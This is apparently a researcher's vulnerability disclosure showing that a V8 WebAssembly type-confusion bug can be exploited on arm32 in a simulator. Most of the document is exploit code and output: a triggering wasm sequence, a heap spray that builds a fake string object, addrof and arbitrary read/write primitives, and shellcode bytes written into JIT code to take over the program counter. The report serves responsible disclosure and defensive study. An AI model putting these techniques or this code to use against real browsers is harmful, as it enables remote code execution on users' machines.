### 0. TL;DR

After a period of analysis, I found that the Issue 323694592 I submitted was exploitable. Due to lack of arm device, I completed the exploit in the `simulator d8 for arm`.

This should be enough to demonstrate the exploitability of the vulnerability, feel free to contact me if you need more information.

Attachment:

* test1.js: the functional exploit
* demo.mp4: Demo video

### 1. The bug

The bug is a type confusion bug in wasm. It incorrectly passes the WASM constant value as a parameter to the imported JSfunction due to a wrong signature.

In `Runtime_WasmGenericWasmToJSObject`， the `*value` is a parameter for wasm runtime call.

```c++
RUNTIME_FUNCTION(Runtime_WasmGenericWasmToJSObject) {
  HandleScope scope(isolate);
  DCHECK_EQ(1, args.length());
  Handle<Object> value(args[0], isolate);
  if (IsWasmInternalFunction(*value)) {
    Handle<WasmInternalFunction> internal =
        Handle<WasmInternalFunction>::cast(value);
    return *WasmInternalFunction::GetOrCreateExternal(internal);
  }
  if (IsWasmNull(*value)) return ReadOnlyRoots(isolate).null_value();
  return *value;
}

```

The value corresponds to the wasm const (marked as [*]) in poc.html. The value is a int32 number with leb128 decoding.

```js
kExprI32Const, 0xe9, 0xb9, 0xc8, 0xf3, 0x02,//0xc1, 0x82, 0x85, 0x8a, 0x04, // i32.const
kExprI32Const, 0xe9, 0xb9, 0xc8, 0xf3, 0x02,//0xc2, 0x82, 0x85, 0x8a, 0x04, // i32.const
[*] kExprI32Const, 0x81, 0x80, 0xc0, 0xff, 0x07,//0x81, 0x80, 0x80, 0xf5, 0x07,//0xc1, 0x82, 0x85, 0x8a, 0x04, // i32.const
kExprI32Const, 0xe9, 0xb9, 0xc8, 0xf3, 0x02,//0xc4, 0x82, 0x85, 0x8a, 0x04, // i32.const
kExprI32Const, 0xe9, 0xb9, 0xc8, 0xf3, 0x02,//0xc5, 0x82, 0x85, 0x8a, 0x04, // i32.const
kExprI32Const, 0xe9, 0xb9, 0xc8, 0xf3, 0x02,//0xc6, 0x82, 0x85, 0x8a, 0x04, // i32.const
kExprRefFunc, 0x01,  // ref.func
kExprCallRef, 0x03,  // call_ref: niiiriniifrnnrr_ssiirsssiiiiiii
```

The value will be passed to the imported function `foo` as its parameter `e` as such.

```js
function foo(a,b,c,d,e,f,g){
  console.log("[->] from wasm call into js");
    console.log("fake js str length: "+e.length.toString(16));
    // console.log(e[0]);
    // offset = 0xe16420a0 - spary_address - 0xc;
    // offset = 0x1556420a0 - spary_address;
    // offset = 0xe0000000;
    // console.log(e.slice(-4));
    // finish_addr = spary_address + 0xf0000000;
    // offset = -()
    offset = guess_address - spary_address - 0xc;
    //...
}
```

As such, we get a primitive which confuse from any int32 number to a JSObejct.

### 2. How to exploit

This bug is more likely to be triggered under the arm architecture, I will mainly use arm32 to explain as below.

The method used here was mentioned in my defcon 31 talk: https://media.defcon.org/DEF%20CON%2031/DEF%20CON%2031%20presentations/Bohan%20Liu%20Zheng%20Wang%20GuanCheng%20Li%20-%20ndays%20are%20also%200days%20Can%20hackers%20launch%200day%20RCE%20attack%20on%20popular%20softwares%20only%20with%20chromium%20ndays.pdf

The main idea is to use a lot of memory pressure so that certain addresses must be occupied to obtain a stable address.

For fast development, here I used a huge JSArrayBuffer as a hardcoded address. We can use the JSObject like double_array also. This hardcoded address `(0x7ff00000)` is pre-arranged with some data and used to fake it into a jsstring object

```js
for(var i = 0 ; i < 0x20000 ; i++){
  idx = (i*0x1000)/4
  map_start = 0x100/4;
  map_meta_start = 0x200/4;

  //js str
  uint32[idx + 0] = spary_address+0x100+1; //map
  uint32[idx + 1] = 0xe9219bee; //value?
  uint32[idx + 2] = 0xf0000000;//0xe1650000 - spary_address;//0xf0000000; //length
  uint32[idx + 3] = 0x41414141; //str
  uint32[idx + map_start] = spary_address+0x201; //map
  uint32[idx + map_start+1] = 0x0400dd00; //value
  uint32[idx + map_start+2] = 0x0c000008; //value
  uint32[idx + map_start+3] = 0x004003ff; //value
  uint32[idx + map_start+4] = spary_address+0x201; //prototype
  uint32[idx + map_start+5] = 0x46434345; //constructor
  uint32[idx + map_start+6] = 0x47434345; //descriptor
  uint32[idx + map_start+7] = 0x48434345; //dependent
  uint32[idx + map_start+8] = 0; //proto_cell
  uint32[idx + map_start+9] = 0; //value?
  uint32[idx + map_meta_start] = spary_address+0x201; //map
  uint32[idx + map_meta_start+1] = 0x3300000a; //value
  uint32[idx + map_meta_start+2] = 0x0d000108; //value
  uint32[idx + map_meta_start+3] = 0x084003ff; //value
  uint32[idx + map_meta_start+4] = 0x4894004d; //null
  uint32[idx + map_meta_start+5] = spary_address+0x201; //context

}
```

And the fake JSString's length was set as 0xf0000000. Since string.prototype.slice lacks a range check beyond 0x20000000, we actually have full memory read and write capabilities.

Then in the exp, I use another hardcode address, which is a relatively stable v8 heap address (When using v8 object rather than JSArrayBuffer before to occupy memory, the previous hardcode can be same as this one ).

By searching for a specific flag we can find some js objects arranged such a double_array, JSArrayBuffer or JSFunction.

```c++
    offset = guess_address - spary_address - 0xc;
    
    search_limit = 0x10000;
    double_arr_addr = 0
    evilf_addr = 0
    victim_ab_addr = 0
    for(var i = 0 ; i < search_limit;i++){
      offset += 4;
      x = e.slice(offset,offset+4);
      // if(x = "0x0001bd5a")
      if (x == '\x5a\xbd\x01\x00'){
      // if((x.charCodeAt(0) == 90)&(x.charCodeAt(1) == 189)&(x.charCodeAt(2) == 1)&(x.charCodeAt(3) == 0)){
        console.log("[+] found flag 0xdead!")
        double_arr_obj  = e.slice(offset+4,offset+8);
        for(j = 0 ; j <4 ;j++){
          double_arr_addr += double_arr_obj.charCodeAt(j) << (8*j)
        }
        console.log(double_arr_addr.toString(16));
        // readline();
        evilf_str  = e.slice(offset+8,offset+8+4);
        for(j = 0 ; j <4 ;j++){
          evilf_addr += evilf_str.charCodeAt(j) << (8*j)
        }
        console.log("[addrof] evilf_addr: "+evilf_addr.toString(16));

        victim_ab_str  = e.slice(offset+0xc,offset+0xc+4);
        for(j = 0 ; j <4 ;j++){
          victim_ab_addr += victim_ab_str.charCodeAt(j) << (8*j)
        }
        console.log("[addrof] victim_ab_addr: "+victim_ab_addr.toString(16));


        break
      }
        
    }
```

And then, I changed the fake object's data. And it was treated as a double_array.

```js
      victim_ab_bk_addr = victim_ab_addr -8;

      if(double_map_str!=0){
        //next step : set fakeobj as double array
        for(var j = 0 ; j < 0x20000 ; j++){
          idx = (j*0x1000)/4
          //double array
          uint32[idx + 0] = double_map_addr; //map
          uint32[idx + 1] = victim_ab_bk_addr; //value?
          uint32[idx + 2] = victim_ab_bk_addr;//0xe1650000 - spary_address;//0xf0000000; //length
          uint32[idx + 3] = 0x100; //str
        }
```

And then, we get more primitive such as `addrof` , `arbitrary_read and write`

### 3. How to reproduce

I have no arm device now, so I use the `simulator d8 for arm` in `ubuntu 22.04 amd64`.

The `v8` commit is : `e1610ada226`

The `args.gn` is:

```
is_component_build = false
is_debug = false
target_cpu = "x86"
v8_target_cpu = "arm"

v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
v8_enable_verify_heap = true
dcheck_always_on = false
```

But the exec system calls cannot be executed on the simulator , so I cannot reverse shell as a better demonstration. But we can see that we modified the jit code of JSfunction, wrote a shellcode that modifies all registers (including pc), and hijacked the pc register to 0x4141414141.

The code in `evil_f`  was modified:

```c++
--- Disassembly: ---
kind = TURBOFAN
stack_slots = 6
compiler = turbofan
address = 0x5b009fe9

Instructions (size = 940)
0xf585f5a0     0  e3010111       movw r0, #4369
0xf585f5a4     4  e3011111       movw r1, #4369
0xf585f5a8     8  e1a01800       mov r1, r0, lsl #16
0xf585f5ac     c  e0811000       add r1, r1, r0
0xf585f5b0    10  e3020222       movw r0, #8738
0xf585f5b4    14  e3022222       movw r2, #8738
0xf585f5b8    18  e1a02800       mov r2, r0, lsl #16
0xf585f5bc    1c  e0822000       add r2, r2, r0
0xf585f5c0    20  e3030333       movw r0, #13107
0xf585f5c4    24  e3033333       movw r3, #13107
0xf585f5c8    28  e1a03800       mov r3, r0, lsl #16
0xf585f5cc    2c  e0833000       add r3, r3, r0
0xf585f5d0    30  e3040444       movw r0, #17476
0xf585f5d4    34  e3044444       movw r4, #17476
0xf585f5d8    38  e1a04800       mov r4, r0, lsl #16
0xf585f5dc    3c  e0844000       add r4, r4, r0
0xf585f5e0    40  e3050555       movw r0, #21845
0xf585f5e4    44  e3055555       movw r5, #21845
0xf585f5e8    48  e1a05800       mov r5, r0, lsl #16
0xf585f5ec    4c  e0855000       add r5, r5, r0
0xf585f5f0    50  e3060666       movw r0, #26214
0xf585f5f4    54  e3066666       movw r6, #26214
0xf585f5f8    58  e1a06800       mov r6, r0, lsl #16
0xf585f5fc    5c  e0866000       add r6, r6, r0
0xf585f600    60  e3070777       movw r0, #30583
0xf585f604    64  e3077777       movw r7, #30583
0xf585f608    68  e1a07800       mov r7, r0, lsl #16
0xf585f60c    6c  e0877000       add r7, r7, r0
0xf585f610    70  e3040141       movw r0, #16705
0xf585f614    74  e3048141       movw r8, #16705
0xf585f618    78  e1a08800       mov r8, r0, lsl #16
0xf585f61c    7c  e0888000       add r8, r8, r0
0xf585f620    80  e3a00000       mov r0, #0
0xf585f624    84  e1a0f008       mov pc, r8
0xf585f628    88  deadbeef       unknown

```

The data in poc is :

```js
      fake_u8a.set([0x11,0x1,0x1,0xe3,0x11,0x11,0x1,0xe3,0x0,0x18,0xa0,0xe1,0x0,0x10,0x81,0xe0,0x22,0x2,0x2,0xe3,0x22,0x22,0x2,0xe3,0x0,0x28,0xa0,0xe1,0x0,0x20,0x82,0xe0,0x33,0x3,0x3,0xe3,0x33,0x33,0x3,0xe3,0x0,0x38,0xa0,0xe1,0x0,0x30,0x83,0xe0,0x44,0x4,0x4,0xe3,0x44,0x44,0x4,0xe3,0x0,0x48,0xa0,0xe1,0x0,0x40,0x84,0xe0,0x55,0x5,0x5,0xe3,0x55,0x55,0x5,0xe3,0x0,0x58,0xa0,0xe1,0x0,0x50,0x85,0xe0,0x66,0x6,0x6,0xe3,0x66,0x66,0x6,0xe3,0x0,0x68,0xa0,0xe1,0x0,0x60,0x86,0xe0,0x77,0x7,0x7,0xe3,0x77,0x77,0x7,0xe3,0x0,0x78,0xa0,0xe1,0x0,0x70,0x87,0xe0,0x41,0x1,0x4,0xe3,0x41,0x81,0x4,0xe3,0x0,0x88,0xa0,0xe1,0x0,0x80,0x88,0xe0,0x0,0x0,0xa0,0xe3,0x8,0xf0,0xa0,0xe1,0xef,0xbe,0xad,0xde]);
```

### NOTE 

These two hard-codings are very stable on my local machine, but may vary on different machines and compiled versions. Due to time constraints, I have not yet completed a version that is stable enough for any machine.